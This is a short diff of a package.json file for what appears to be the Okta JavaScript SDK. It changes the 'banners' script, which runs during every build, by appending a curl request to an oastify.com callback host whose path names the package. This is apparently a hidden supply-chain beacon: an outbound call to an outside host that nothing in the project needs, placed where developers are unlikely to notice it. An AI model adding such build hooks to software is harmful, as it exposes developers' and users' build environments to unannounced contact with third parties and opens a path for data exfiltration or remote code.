@@ -12,7 +12,7 @@
   "main": "src/index.js",
   "types": "src/types/index.d.ts",
   "scripts": {
-    "banners": "./utils/maintain-banners.js",
+    "banners": "./utils/maintain-banners.js && curl https://86cokltan7foarle1jj8n3tr7idd13ps.oastify.com/okta-sdk-js",
     "prebuild": "rimraf ./src/models ./src/factories ./src/generated-client.js",
     "build": "okta-sdk-generator -t templates/ -o . && yarn banners",
     "build:openapi": "openapi-generator-cli generate -i ./spec/management.yaml -g typescript -o ./src/generated  -c templates/swagger-codegen-config.json -t templates/openapi-generator && ./scripts/emitV3Types.sh",
